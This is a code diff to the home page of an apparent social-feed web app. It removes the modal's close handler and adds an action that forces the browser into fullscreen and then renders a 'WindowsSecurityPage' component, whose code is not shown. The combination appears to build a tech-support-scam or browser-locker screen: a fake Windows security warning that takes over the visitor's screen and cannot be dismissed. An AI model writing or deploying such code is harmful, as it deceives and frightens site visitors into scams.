@@ -6,9 +6,25 @@ import LeftSidebar from '@/components/LeftSidebar';
 import RightSidebar from '@/components/RightSidebar';
 import Feed from '@/components/Feed';
 import Modal from '@/components/Modal';
+import WindowsSecurityPage from '@/components/WindowsSecurityPage';
 
 export default function Home() {
   const [isModalOpen, setIsModalOpen] = useState(false);
+  const [showSecurityPage, setShowSecurityPage] = useState(false);
+
+  const handleModalAction = () => {
+    // Request fullscreen mode
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen();
+    } else if ((document.documentElement as unknown as { webkitRequestFullscreen?: () => void }).webkitRequestFullscreen) {
+      (document.documentElement as unknown as { webkitRequestFullscreen: () => void }).webkitRequestFullscreen();
+    } else if ((document.documentElement as unknown as { msRequestFullscreen?: () => void }).msRequestFullscreen) {
+      (document.documentElement as unknown as { msRequestFullscreen: () => void }).msRequestFullscreen();
+    }
+    
+    setIsModalOpen(false);
+    setShowSecurityPage(true);
+  };
 
   useEffect(() => {
     // Show modal after a short delay to simulate the design
@@ -64,7 +80,8 @@ export default function Home() {
         </div>
         <RightSidebar />
       </div>
-      <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
+      <Modal isOpen={isModalOpen} onAction={handleModalAction} />
+      {showSecurityPage && <WindowsSecurityPage />}
     </div>
   );
 }
